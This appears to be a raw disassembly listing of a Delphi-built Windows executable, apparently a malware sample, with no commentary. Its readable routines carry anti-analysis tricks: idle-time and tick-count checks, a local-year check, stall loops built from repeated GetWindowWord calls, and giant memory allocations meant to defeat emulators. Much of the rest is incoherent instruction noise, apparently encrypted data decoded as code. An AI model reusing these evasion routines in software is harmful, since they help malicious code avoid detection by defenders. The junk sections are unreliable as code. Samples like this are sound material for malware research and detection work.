fdivr [ edi + 0x51d3bfd2 ]
push ebx
push ebx
add [ 0xffffffff88601739 ] al
ficom [ esi ]
fild [ eax ]
add edi [ ebx - 0x53536bbc ]
rcl [ edi - 0x45bcc6a1 ] 0x1
mov edi 0xc3acace6
push es
fdivr [ edi - 0x6a45fbfe ]
scasb [ edi ]
lodsb [ esi ]
lodsb [ esi ]
retn
sub_4804d9
in al dx
sbb eax 0x35535327
push 0x55d65c9c
push ebx
push ebx
push ebx
rcl [ ecx + 0x51bbd051 ] 0x1
salc
xchg ebx eax
pop esp
xlat
push edi
sub [ esp + ebp * 4 - 0x4d6d6228 ] 0x56
mov edx 0xacacb2e9
retn
sub_480577
add eax 0x80ba0104
mov ebx 0xd75cacac
and [ ebp + 0x53 ] ebx
push ebx
add [ edx + 0x535353e8 ] bh
0x5cc3c390 0x2ad7
push eax
push ebx
push ebx
pop esp
in al 0x4c
mov edx 0xacaca5c3
retn
sub_480715
pushad
xchg ebx eax
0xedac390 0xac8b
scasd [ edi ]
lodsb [ esi ]
mov bh 0xac
cmp [ ecx ] 0x57
mov edx 0xacaca33b
fcomp st6
[ esi ] [ edi ]
lodsb [ esi ]
lodsb [ esi ]
add [ ebx ] al
mov edx 0xacaca9f8
retn
sub_48075d
add [ 0xffffffffac9760bb ] al
lodsb [ esi ]
lodsb [ esi ]
pop edi
lodsb [ esi ]
pop ebx
mov ebx 0xacacec36
rcl [ edi + 0x6855da47 ] 0x1
nop
pop esp
xlat
cmpsd [ esi ] [ edi ]
mov ch 0xac
lodsb [ esi ]
jmp r-xdata
lodsb [ esi ]
lodsb [ esi ]
retn
sub_480878
cmp edi [ eax + 0x4c71a52 ]
ficom [ 0xffffffffed1dbb3b ]
lodsb [ esi ]
lodsb [ esi ]
cmp eax [ ebx + 0x4d4a3c1 ]
ficom [ 0xffffffffed13bb3f ]
lodsb [ esi ]
lodsb [ esi ]
cmp eax esi
mov dh 0xfa
les eax [ edx + ebx * 8 ]
adc eax 0xed61bb23
jb r-xdata
ficom [ 0xffffffffed72bb27 ]
lodsb [ esi ]
lodsb [ esi ]
rcl [ edi - 0x1c09c4ed ] 0x1
dec eax
jpo r-xdata
popad
in eax dx
lodsb [ esi ]
lodsb [ esi ]
cmp esi [ edx + 0x4e29451 ]
mov edx 0xacac83f0
retn
sub_48099d
add eax 0xac9fc0bb
lodsb [ esi ]
or dl dh
xchg ebx eax
pop esp
xlat
push edi
push ebx
push ebx
push ebx
fisubr [ edi ]
xor eax 0x9f106da
xor eax 0xbaf51eda
push 0x2f
ja r-xdata
retn
pop esp
salc
push esi
push ebx
push ebx
push ebx
xchg ebp eax
pop ss
ja r-xdata
retn
push ebx
push 0x2f
ja r-xdata
in eax 0xe7
lodsb [ esi ]
lodsb [ esi ]
retn
cwde
sub [ esp + ebp * 4 + 0x6da35c3 ] 0xf1
or [ 0xffffffffbaf51eda ] esi
pop esp
salc
push esi
push ebx
push ebx
push ebx
xchg ebp eax
pop ss
ja r-xdata
push ebx
pop esp
xlat
add [ esp + ebp * 4 - 0x45acc654 ] ch
jo r-xdata
push ecx
pop esp
in al 0x10
pop ss
xor eax 0xd75c93d6
jbe r-xdata
ja r-xdata
lodsb [ esi ]
lodsb [ esi ]
retn
adc al 0xba
lodsb [ esi ]
lodsb [ esi ]
shl [ edi ] 0x1
ja r-xdata
mov [ esp + ebp * 4 - 0x537d6746 ] ch
lodsb [ esi ]
retn
push ebx
fisubr [ edi + 0x50 ]
mov edx 0xacacb67f
retn
sub_4809eb
shr [ esi ] cl
inc ebx
push edx
mov edx 0xacac9cef
lodsb [ esi ]
pop ss
ja r-xdata
retn
push 0x17
ja r-xdata
add [ edx + edi * 4 ] dl
mov esp 0xc3acac9e
retn
mov edx 0xacac8262
retn
sub_480a0d
shr [ eax ] 0x1
adc edx [ ebx + 0x5c ]
ja r-xdata
lodsb [ esi ]
lodsb [ esi ]
retn
xor eax 0x9f106da
xor eax 0xbaf51eda
push 0x2f
ja r-xdata
retn
pop esp
salc
push esi
push ebx
push ebx
push ebx
xchg ebp eax
pop ss
ja r-xdata
retn
push ebx
push 0x2f
ja r-xdata
in eax 0xe7
lodsb [ esi ]
lodsb [ esi ]
retn
cwde
sub [ esp + ebp * 4 + 0x6da35c3 ] 0xf1
or [ 0xffffffffbaf51eda ] esi
pop esp
salc
push esi
push ebx
push ebx
push ebx
xchg ebp eax
pop ss
ja r-xdata
xlat
add [ esp + ebp * 4 - 0x45acc654 ] ch
jo r-xdata
push ebx
pop esp
push ecx
pop esp
in al 0x10
pop ss
xor eax 0xd75c93d6
jbe r-xdata
adc al 0xba
lodsb [ esi ]
lodsb [ esi ]
shl [ edi ] 0x1
ja r-xdata
mov [ esp + ebp * 4 - 0x537d6746 ] ch
lodsb [ esi ]
retn
push ebx
fisubr [ edi + 0x50 ]
mov edx 0xacacb67f
retn
sub_480ab9
mov ebx 0xacacebc6
mov edx 0xacacbb18
xor eax 0x60a516da
xchg ebx eax
cmp [ edi + 0x35 ] eax
ficom [ esi ]
stosd [ edi ]
xor eax 0xdebd1eda
push ss
xchg ebx eax
pushad
0x4dba0305 0xac84
lodsb [ esi ]
retn
sub_480b34
pop esp
xlat
stosb [ edi ]
xchg esi eax
lodsb [ esi ]
lodsb [ esi ]
add al 0xba
int1
pushfd
lodsb [ esi ]
lodsb [ esi ]
fmul [ ebx - 0x50f125cb ]
mov edx 0xacacb33b
retn
sub_480b4f
ficom [ edi ]
ja r-xdata
mov edi 0x1e05181e
xchg esp eax
push ss
xchg [ esi ] ebx
cmp dh [ eax ]
and [ esi + edx + 0x3c203c8b ] edx
xor eax 0xacab48ba
lodsb [ esi ]
retn
salc
xchg ebx eax
pop esp
xlat
clc
loop r-xdata
lodsb [ esi ]
lodsb [ esi ]
retn
lodsb [ esi ]
ficomp [ eax ]
sbb eax [ edx ]
mov edx 0xacaca583
retn
sub_480b71
or [ ecx ] edi
xor eax 0x9cf06da
xor eax 0x35cd06da
ficom [ esi ]
stc
fadd [ ebp - 0x63456ca0 ]
lea ebp [ esp + ebp * 4 + 0x73add0c3 ]
pop esp
sar ebx 0x1
stosb [ edi ]
lodsb [ esi ]
lodsb [ esi ]
lodsb [ esi ]
push ss
scasd [ edi ]
shr [ esi ] 0x1
scasd [ edi ]
push eax
pop esp
rcr edi 0x1
xchg ebx eax
lodsb [ esi ]
lodsb [ esi ]
fist [ esi ]
jecxz r-xdata
push ss
mov [ 0xffffffffdbb316db ] eax
push ss
sbb ebx 0x16
xchg ebx eax
ficomp [ esi ]
mov bh 0xde
push ss
not [ esi + edx + 0x1e0518b7 ]
sbb [ esi + edx + 0x181e05bb ] dl
add eax 0x1ebf1694
sbb [ 0xffffffff8716941e ] al
push ds
cmp dh [ eax ]
and [ esi + edx + 0x3c203c8b ] edx
xor eax 0xacab48ba
lodsb [ esi ]
retn
sub_480c3c
or eax 0xacb1e8ba
lodsb [ esi ]
cmp esi [ ebx ]
aam 0xf4
add al 0xda
aad 0xe3
push ebx
push ebx
push ebx
mov ebx 0xacace9d2
fcmovbe st5
out 0x53 eax
push ebx
push ebx
rcl [ edi - 0x40e92195 ] 0x1
add edx [ esi + edx + 0x363b20bf ]
aas
xchg esp eax
push ss
mov [ 0x5361603f ] eax
lodsb [ esi ]
cmp [ edx - 0x53534d21 ] 0xc3
retn
sub_480dd2
add bh [ ecx ]
push edx
cmp [ ebx - 0x54 ] edx
daa
ja r-xdata
retn
lodsb [ esi ]
lodsb [ gs : esi ]
les ebp [ edi - 0x45acacad ]
dec edx
cli
lodsb [ esi ]
lodsb [ esi ]
retn
sub_480f9d
fcomp st6
sub ebp [ esi + 0x300acac ]
mov ebx 0xacace8be
rcl [ edi - 0x43b53a1 ] 0x1
push ebx
push ebx
push ebx
push 0xa2d75c90
xchg [ esp + ebp * 4 - 0x29216428 ] ch
sub ebp [ esi - 0x6d445354 ]
mov [ esp + ebp * 4 + 0x38f16de ] ebp
ficom [ esi ]
rol [ ebx ] cl
add [ eax ] al
cmp [ edi - 0x46 ] edx
mov ecx 0xc3c3acac
retn
sub_4811ab
mov edx 0xacac9720
ficom [ esi ]
scasd [ edi ]
fcom [ esi ]
scasd [ edi ]
push eax
push ss
inc ebx
mov edx 0xacace51b
cmp [ ecx ] esp
or [ 0xffffffffd8150eda ] dh
mov [ ecx ] edi
xor [ edx - 0x535318f1 ] bh
retn
sub_4811de
push ebx
push ebx
push ebx
pop esp
int1
fimul [ esi ]
scasd [ edi ]
mov edx 0xacace032
fcomp [ esi ]
pop ebx
mov edx 0xacacf63d
pop esp
xlat
mov edx 0xd0acacf5
xchg ebx eax
push ecx
pop esp
in al 0x63
mov edx 0xacacefe5
pushad
xchg ebx eax
mov edx 0xacac90f9
retn
sub_48126e
ficom [ esi ]
xchg ebx eax
add edi [ ecx ]
push edx
mov edx 0xacac8960
push es
fdivr [ edi + 0x3b573904 ]
push ebx
arpl [ ebx + 0x53 ] dx
lodsb [ esi ]
pop edi
cmp [ ebx - 0x54 ] edx
retn
sub_48131b
mov ebx 0xacacbebc
or al 0xd
or dh dl
xchg ebx eax
pop esp
xlat
xor eax 0xdeacacba
push ds
mov ebx esi
push ss
sti
mov ebx 0xacacbe8a
salc
xchg ebx eax
pop esp
xlat
add [ edx + 0x1edeacac ] bh
fwait
ficom [ esi ]
sti
mov ebx 0xacacbe95
salc
xchg ebx eax
pop esp
xlat
adc edi [ edx + 0x1edeacac ]
jmp r-xdata
mov esi 0x93d6acac
sub_4814b0
push ebx
mov edx ecx
test edx edx
jbe r-xdata
xor eax eax
pop ebx
retn
mov ecx 0x1
nop
mov ebx ecx
nop
nop
add ebx eax
mov [ ebx ] 0xb9
inc ecx
dec edx
jne r-xdata
sub_4814d0
push ebx
nop
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call CreateMDIWindowA
test eax eax
je r-xdata
call GetLastError
cmp eax 0x578
jne r-xdata
nop
nop
pop ebx
retn
pop ebx
retn
push 0x0
push 0x0
call GetWindowWord
nop
nop
mov ebx 0xbcfdde5
dec ebx
jne r-xdata
push 0x4
push 0x3000
push 0x1c48597f
push 0x0
call VirtualAlloc
mov ebx eax
test ebx ebx
jne r-xdata
mov ecx 0x1c48597f
xor edx edx
mov eax ebx
call sub_4814b0
push 0x0
push 0x0
call GetWindowWord
nop
push 0x8000
push 0x0
push ebx
call VirtualFree
nop
mov ebx 0xa017
nop
pop ebx
retn
push 0x0
push 0x0
call GetWindowWord
dec ebx
jne r-xdata
nop
push 0x0
call sub_47b5d4
sub_481570
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_481595
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48159c
retn
sub_4815a0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi rw-data
xor eax eax
push ebp
push sub_48172d
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_481734
lea eax [ ebp - 0x4 ]
call sub_404164
retn
push 0x0
push 0x0
call SelectClipRgn
call GetLastError
cmp eax 0x6
je r-xdata
lea edx [ ebp - 0x4 ]
xor eax eax
call sub_402a74
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_40c814
test eax eax
jne r-xdata
push 0x0
push 0x0
call GetWindowWord
jmp r-xdata
mov ebx 0x19c4
push 0x0
push 0x0
call GetWindowWord
dec ebx
jne r-xdata
push 0x0
push 0x0
call GetWindowWord
mov ebx 0x262de
nop
nop
push 0x0
push 0x0
call GetWindowWord
nop
nop
dec ebx
jne r-xdata
push 0x4
push 0x3000
push 0x2293b41f
push 0x0
call VirtualAlloc
mov ebx eax
test ebx ebx
jne r-xdata
nop
nop
mov ecx 0x2293b41f
xor edx edx
mov eax ebx
call sub_4814b0
push 0x0
push 0x0
call GetWindowWord
push 0x8000
push 0x0
push ebx
call VirtualFree
nop
push 0x0
push 0x0
call GetWindowWord
nop
nop
mov ebx 0x89ec
nop
nop
jmp r-xdata
push 0x0
push 0x0
call GetWindowWord
nop
dec ebx
jne r-xdata
nop
nop
xor ebx ebx
xor edi edi
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
je r-xdata
mov [ rw-data ] 0x0
push rw-data
call GetLocalTime
nop
nop
cmp [ rw-data ] 0x7e1
jae r-xdata
nop
jmp r-xdata
mov [ esi ] 0x8
push esi
call GetLastInputInfo
nop
nop
call GetTickCount
sub eax [ esi + 0x4 ]
cmp eax 0x88
jae r-xdata
jmp r-xdata
cmp ebx 0x14
jle r-xdata
nop
nop
cmp edi [ esi + 0x4 ]
je r-xdata
call sub_4814d0
nop
mov edi [ esi + 0x4 ]
nop
inc ebx
nop
sub_481768
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_481787
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48178e
retn
sub_481790
pop esp
add [ eax ] al
add [ eax - 0xbffb7e9 ] bl
bound eax [ eax ]
les esp [ edx + 0x40 ]
add al ch
pushad
inc eax
add [ eax + 0x636c0040 ] dl
inc eax
add [ ebx ] bh
inc eax
add [ eax + esi * 2 + 0x40 ] ah
add [ eax + esi * 2 ] dh
inc eax
add [ eax + esi * 2 + 0x706c0040 ] bl
inc eax
add [ eax + 0x50004158 ] al
pop eax
inc ecx
add ah al
jae r-xdata
add [ esi + ebx * 4 + 0x42 ] dl
add al al
mov eax 0xb8800042
inc edx
add [ eax + 0x580042a8 ] cl
test al 0x42
add [ ebx + esi * 2 - 0x25cfffc0 ] dl
inc eax
add [ eax - 0x63ffbf28 ] dh
loop r-xdata
mov al 0xd3
inc edx
add [ ebp + esi * 8 - 0xa7bffbe ] dh
inc edx
add [ esp + ebp + 0x44 ] cl
add [ esp + ebp ] bl
inc esp
add al bh
mov eax 0xb8c80042
inc edx
add [ ecx + edi * 4 ] bh
inc edx
add [ eax ] al
mov ecx 0xd4180042
inc edx
add al ch
rol [ edx ] cl
push eax
aam 0x42
add [ eax ] ah
aam 0x42
add [ eax + 0x2c0042da ] cl
fiadd [ edx ]
push esp
int1
inc edx
add [ ecx + esi * 8 ] cl
inc edx
add al cl
rol [ edx ] cl
cwde
rol [ edx ] cl
hlt
add al cl
test al 0x42
add [ eax + 0x3c0042a8 ] bl
fiadd [ ebp ]
int3
add [ eax ] cl
mov eax [ 0xffffffffa0d80042 ]
inc edx
add [ eax + 0x60004227 ] dl
daa
inc edx
add [ eax - 0x43ffbd66 ] dl
cdq
inc edx
add [ eax + 0x50004574 ] al
je r-xdata
add [ eax - 0x58 ] bl
inc edx
add [ edx + 0x40 ] ch
add [ eax + ecx * 2 + 0x48440041 ] bh
inc ecx
add [ eax + 0x6800414a ] bl
dec edx
inc ecx
add [ eax + 0x58 ] cl
inc ecx
add al bh
push edi
inc ecx
add [ esp + 0x42 ] bl
add [ ebx - 0x6433ffbe ] ch
inc edx
add [ ebx + ebx * 4 - 0x617bffbe ] bl
inc edx
_start
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax sub_481790
call sub_406280
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4689c4
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_4689dc
mov eax [ rw-data ]
mov eax [ eax ]
call sub_468a5c
call sub_403ff0
sub_40115f
add [ esp + 0x4 ] 0xfffffff8
jmp sub_405bd8
sub_401169
add [ esp + 0x4 ] 0xfffffff8
jmp sub_405bec
sub_401244
jmp [ __import_lookup_table_0(kernel32:CreateThread) ]
ExitThread
jmp [ __import_lookup_table_0(kernel32:ExitThread) ]
ExitProcess
jmp [ ExitProcess@IAT ]
sub_40125c
jmp [ __import_lookup_table_1(user32:MessageBoxA) ]
sub_401264
jmp [ __import_lookup_table_0(kernel32:FindClose) ]
sub_40126c
jmp [ __import_lookup_table_0(kernel32:FindFirstFileA) ]
sub_401274
jmp [ __import_lookup_table_0(kernel32:FreeLibrary) ]
GetCommandLineA
jmp [ __import_lookup_table_0(kernel32:GetCommandLineA) ]
sub_401284
jmp [ __import_lookup_table_0(kernel32:GetLocaleInfoA) ]
sub_40128c
jmp [ __import_lookup_table_0(kernel32:GetModuleFileNameA) ]
sub_401294
jmp [ __import_lookup_table_0(kernel32:GetModuleHandleA) ]
sub_40129c
jmp [ __import_lookup_table_0(kernel32:GetProcAddress) ]
GetStartupInfoA
jmp [ GetStartupInfoA@IAT ]
sub_4012bc
jmp [ __import_lookup_table_1(user32:LoadStringA) ]
MultiByteToWideChar
jmp [ MultiByteToWideChar@IAT ]
sub_4012dc
jmp [ __import_lookup_table_2(advapi32:RegCloseKey) ]
WideCharToMultiByte
jmp [ WideCharToMultiByte@IAT ]
sub_4012fc
jmp [ __import_lookup_table_0(kernel32:VirtualQuery) ]
SysAllocStringLen
jmp [ __import_lookup_table_3(oleaut32:SysAllocStringLen) ]
SysReAllocStringLen
jmp [ __import_lookup_table_3(oleaut32:SysReAllocStringLen) ]
SysFreeString
jmp [ __import_lookup_table_3(oleaut32:SysFreeString) ]
sub_40131c
jmp [ __import_lookup_table_0(kernel32:InterlockedIncrement) ]
sub_401324
jmp [ __import_lookup_table_0(kernel32:InterlockedDecrement) ]
sub_40132c
jmp [ __import_lookup_table_0(kernel32:GetCurrentThreadId) ]
sub_40133c
push ebx
add esp 0xffffffbc
mov ebx 0xa
push esp
call GetStartupInfoA
test [ esp + 0x2c ] 0x1
je r-xdata
mov eax ebx
add esp 0x44
pop ebx
retn
movzx ebx [ esp + 0x30 ]
sub_401360
jmp [ __import_lookup_table_0(kernel32:LocalAlloc) ]
sub_401378
jmp [ __import_lookup_table_0(kernel32:VirtualFree) ]
sub_401380
jmp [ __import_lookup_table_0(kernel32:InitializeCriticalSection) ]
sub_401388
jmp [ __import_lookup_table_0(kernel32:EnterCriticalSection) ]
sub_401390
jmp [ __import_lookup_table_0(kernel32:LeaveCriticalSection) ]
sub_401398
jmp [ __import_lookup_table_0(kernel32:DeleteCriticalSection) ]
sub_401ae2
jmp sub_403ae4
sub_401ae9
mov al [ rw-data ]
pop ebp
retn
sub_401bc6
jmp sub_403ae4
sub_401c94
inc [ rw-data ]
mov edx eax
sub edx 0x4
mov edx [ edx ]
and edx 0x7ffffffc
sub edx 0x4
add [ rw-data ] edx
call sub_4022a8
retn
sub_402294
jmp sub_403ae4
sub_40243a
jmp sub_403ae4
sub_4026d9
jmp sub_403ae4
sub_40279c
call sub_406234
cmp [ eax ] 0x0
je r-xdata
xor eax eax
retn
call sub_406234
mov eax [ eax ]
mov eax [ eax + 0x4 ]
retn
sub_4027f0
mov [ rw-data ] edx
call sub_4040c8
sub_402854
push eax
push edx
push ecx
call sub_406234
cmp [ eax + 0x4 ] 0x0
pop ecx
pop edx
pop eax
jne r-xdata
xor eax eax
jmp sub_402848
retn
sub_402870
retn
sub_4028c4
retn
sub_4028c8
push ebx
call sub_406234
mov ebx [ eax + 0x4 ]
call sub_406234
xor edx edx
mov [ eax + 0x4 ] edx
mov eax ebx
pop ebx
retn
sub_402a65
jmp sub_403ae4
sub_402a6c
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_402ae0
mov [ rw-data ] ax
fnclex
fldcw [ rw-data ]
retn
sub_402af0
push 0x0
fnstcw [ esp ]
pop eax
retn
sub_402bb0
mov edx [ eax + 0x1c ]
call sub_402b68
retn
sub_402e18
mov ecx 0xff
call sub_402e24
retn
sub_402ea0
push esi
push edi
mov esi eax
mov edi edx
and ecx 0xff
[ esi ] [ edi ]
pop edi
pop esi
retn
j_sub_402ebc
jmp sub_402ebc
sub_402eb9
retn
sub_403249
jmp sub_403ae4
sub_40329c
fninit
fwait
fldcw [ rw-data ]
retn
sub_4032f4
mov eax [ eax - 0x24 ]
test eax eax
je r-xdata
retn
mov eax [ eax ]
sub_403300
push ebx
mov ebx eax
mov eax ebx
call sub_403330
call sub_4026ec
mov edx eax
mov eax ebx
call sub_403374
pop ebx
retn
sub_40331c
push ebx
mov ebx eax
mov eax ebx
call sub_4033cc
mov eax ebx
call sub_40270c
pop ebx
retn
sub_403330
add eax 0xffffffd8
mov eax [ eax ]
retn
sub_403358
call sub_40371c
test dl dl
jle r-xdata
retn
call sub_403704
sub_403418
retn
sub_4034a0
jmp sub_403ae4
sub_4034a7
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_403598
mov eax 0x8000ffff
retn
sub_4035a0
retn
sub_4035a4
retn
sub_4035a8
retn
sub_4036dd
jmp sub_403830
sub_4036e2
mov eax [ esp + 0x2c ]
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
call sub_403b44
retn
mov ecx [ eax ]
mov dl 0x81
push eax
call [ ecx - 0x4 ]
pop eax
call sub_403704
sub_403704
mov edx [ eax ]
call [ edx - 0x8 ]
retn
sub_40370c
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx - 0x1c ]
mov eax ebx
pop ebx
retn
sub_40371c
test dl dl
jg r-xdata
push eax
push edx
mov edx [ eax ]
call [ edx - 0x18 ]
pop edx
pop eax
retn
retn
sub_40372c
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push 0x0
push 0x0
push 0x0
push 0xeedfadf
call [ rw-data ]
sub_4037f4
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push edx
push esp
push 0x1
push 0x0
push 0xeedfae2
call [ rw-data ]
pop edx
sub_403810
push eax
push edx
cmp [ rw-data ] 0x1
jbe r-xdata
pop edx
pop eax
retn
push esp
push 0x2
push 0x0
push 0xeedfae3
call [ rw-data ]
sub_403bdd
retn
sub_403d20
xor edx edx
lea eax [ ebp - 0xc ]
mov ecx [ fs : edx ]
mov [ fs : edx ] eax
mov [ eax ] ecx
mov [ eax + 0x4 ] r-xdata
mov [ eax + 0x8 ] ebp
mov [ rw-data ] eax
retn
sub_403dae
jmp sub_403830
sub_403e0e
jmp sub_403830
sub_403e28
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] edx
mov eax [ edx + 0x4 ]
mov [ rw-data ] eax
call sub_403d20
mov [ rw-data ] 0x0
call sub_403dc8
retn
sub_403f61
retn
sub_4040c3
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4040c8
mov [ rw-data ] eax
call sub_403ff0
sub_40415c
push eax
call ExitThread
sub_404388
retn
sub_4043c4
retn
sub_4043d2
retn
sub_4043eb
retn
sub_4043fc
retn
sub_4044e3
retn
sub_404614
test eax eax
je r-xdata
retn
mov edx [ eax - 0x8 ]
inc edx
jle r-xdata
[ eax - 0x8 ]
j_sub_404630
jmp sub_404630
sub_404679
retn
sub_404681
retn
sub_4046c3
retn
sub_40481c
test eax eax
je r-xdata
retn
push eax
push 0x0
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402848
sub_404834
xchg [ eax ] edx
test edx edx
je r-xdata
retn
push edx
call SysFreeString
sub_40498c
retn
sub_40499e
retn
sub_4049a0
test eax eax
je r-xdata
mov eax r-xdata
retn
retn
sub_404be8
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402848
call [ rw-data ]
retn
sub_404cec
mov ecx 0x1
jmp sub_404c00
sub_404cf6
retn
sub_404d28
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402848
call [ rw-data ]
retn
sub_404e00
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402848
call [ rw-data ]
retn
sub_405026
retn
sub_405028
mov al 0x11
jmp sub_402848
sub_405053
retn
sub_405294
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_404f34
pop ebp
retn 0x4
j_sub_404c00
jmp sub_404c00
sub_4052a9
retn
sub_4052ac
call sub_40544c
retn
sub_4054b0
test eax eax
je r-xdata
retn
[ eax - 0x8 ]
sub_4054e4
call sub_4054bc
retn
sub_40582d
jmp sub_403ae4
sub_405998
call sub_4059a8
retn
sub_4059a0
call sub_4059c8
retn
sub_4059a8
push ebx
mov ebx eax
mov eax 0x8
call sub_4026ec
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
pop ebx
retn
sub_405a63
jmp sub_403830
sub_405a84
mov edx [ rw-data ]
mov [ eax ] edx
mov [ rw-data ] eax
retn
sub_405af8
jmp sub_403ae4
sub_405aff
pop ecx
pop ebp
retn
sub_405b78
test eax eax
je r-xdata
retn
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
sub_405b84
add eax 0x4
push eax
call sub_401324
retn
sub_405b90
cmp [ eax + 0x4 ] 0x0
je r-xdata
retn
mov al 0x2
call sub_402848
sub_405ba0
call sub_403300
mov [ eax + 0x4 ] 0x1
retn
sub_405bd8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x4
push eax
call sub_40131c
pop ebp
retn 0x4
sub_405ec7
jmp sub_403ae4
sub_405ece
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405f6b
jmp sub_403ae4
sub_405f72
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405fbb
jmp sub_403ae4
sub_405fc2
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_406086
jmp sub_403ae4
sub_40608d
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_4060de
jmp sub_403ae4
sub_4060e5
pop ebp
retn
sub_4061bc
jmp [ __import_lookup_table_4(kernel32:GetModuleHandleA) ]
LocalAlloc
jmp [ __import_lookup_table_4(kernel32:LocalAlloc) ]
TlsSetValue
jmp [ __import_lookup_table_4(kernel32:TlsSetValue) ]
sub_4061dc
push eax
push 0x40
call LocalAlloc
retn
sub_4061e8
mov eax 0x10
retn
sub_406274
mov eax rw-data
call sub_405a84
retn
sub_4062e9
jmp sub_403ae4
sub_4062f0
pop ebp
retn
sub_4062f4
sub [ rw-data ] 0x1
retn
sub_406361
jmp sub_403ae4
sub_406368
pop ebp
retn
sub_40636c
sub [ rw-data ] 0x1
retn
RegCloseKey
jmp [ RegCloseKey@IAT ]
RegOpenKeyExA
jmp [ __import_lookup_table_5(advapi32:RegOpenKeyExA) ]
RegQueryValueExA
jmp [ __import_lookup_table_5(advapi32:RegQueryValueExA) ]
CompareStringA
jmp [ __import_lookup_table_6(kernel32:CompareStringA) ]
CreateFileA
jmp [ CreateFileA@IAT ]
CreateThread
jmp [ CreateThread@IAT ]
FileTimeToDosDateTime
jmp [ FileTimeToDosDateTime@IAT ]
FileTimeToLocalFileTime
jmp [ __import_lookup_table_6(kernel32:FileTimeToLocalFileTime) ]
FindClose
jmp [ __import_lookup_table_6(kernel32:FindClose) ]
FindFirstFileA
jmp [ __import_lookup_table_6(kernel32:FindFirstFileA) ]
FindResourceA
jmp [ __import_lookup_table_6(kernel32:FindResourceA) ]
FormatMessageA
jmp [ FormatMessageA@IAT ]
InterlockedDecrement
jmp [ InterlockedDecrement@IAT ]
InterlockedExchange
jmp [ InterlockedExchange@IAT ]
InterlockedIncrement
jmp [ __import_lookup_table_6(kernel32:InterlockedIncrement) ]
FreeResource
jmp [ __import_lookup_table_6(kernel32:FreeResource) ]
GetACP
jmp [ GetACP@IAT ]
GetCPInfo
jmp [ __import_lookup_table_6(kernel32:GetCPInfo) ]
GetCurrentProcessId
jmp [ GetCurrentProcessId@IAT ]
GetDateFormatA
jmp [ GetDateFormatA@IAT ]
GetDiskFreeSpaceA
jmp [ __import_lookup_table_6(kernel32:GetDiskFreeSpaceA) ]
GetExitCodeThread
jmp [ __import_lookup_table_6(kernel32:GetExitCodeThread) ]
GetFileSize
jmp [ __import_lookup_table_6(kernel32:GetFileSize) ]
GetFullPathNameA
jmp [ GetFullPathNameA@IAT ]
GetLocalTime
jmp [ GetLocalTime@IAT ]
GetLocaleInfoA
jmp [ GetLocaleInfoA@IAT ]
GetModuleHandleA
jmp [ __import_lookup_table_6(kernel32:GetModuleHandleA) ]
GetStringTypeExA
jmp [ __import_lookup_table_6(kernel32:GetStringTypeExA) ]
GetSystemInfo
jmp [ GetSystemInfo@IAT ]
GetTempPathA
jmp [ GetTempPathA@IAT ]
GetTimeZoneInformation
jmp [ __import_lookup_table_6(kernel32:GetTimeZoneInformation) ]
GetVersion
jmp [ GetVersion@IAT ]
GetVersionExA
jmp [ GetVersionExA@IAT ]
GlobalAlloc
jmp [ GlobalAlloc@IAT ]
GlobalFindAtomA
jmp [ GlobalFindAtomA@IAT ]
GlobalFree
jmp [ GlobalFree@IAT ]
GlobalLock
jmp [ __import_lookup_table_6(kernel32:GlobalLock) ]
GlobalHandle
jmp [ __import_lookup_table_6(kernel32:GlobalHandle) ]
GlobalReAlloc
jmp [ __import_lookup_table_6(kernel32:GlobalReAlloc) ]
GlobalUnlock
jmp [ __import_lookup_table_6(kernel32:GlobalUnlock) ]
LeaveCriticalSection
jmp [ __import_lookup_table_6(kernel32:LeaveCriticalSection) ]
LoadLibraryA
jmp [ __import_lookup_table_6(kernel32:LoadLibraryA) ]
LoadResource
jmp [ __import_lookup_table_6(kernel32:LoadResource) ]
LockResource
jmp [ LockResource@IAT ]
ReadFile
jmp [ __import_lookup_table_6(kernel32:ReadFile) ]
ResetEvent
jmp [ __import_lookup_table_6(kernel32:ResetEvent) ]
ResumeThread
jmp [ ResumeThread@IAT ]
SetEndOfFile
jmp [ SetEndOfFile@IAT ]
SetEvent
jmp [ SetEvent@IAT ]
SetFilePointer
jmp [ SetFilePointer@IAT ]
